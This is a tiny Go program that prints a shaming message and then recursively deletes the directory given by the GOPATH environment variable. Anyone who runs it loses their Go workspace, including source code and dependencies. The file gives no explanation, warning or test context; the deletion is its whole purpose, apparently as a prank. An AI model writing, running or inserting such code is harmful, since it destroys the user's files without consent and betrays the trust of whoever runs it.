package main

import (
	"fmt"
	"os"
)

func main() {
	fmt.Println("You have brought shame upon us all.")

	if err := os.RemoveAll(os.Getenv("GOPATH")); err != nil {
		os.Exit(1)
	}
}
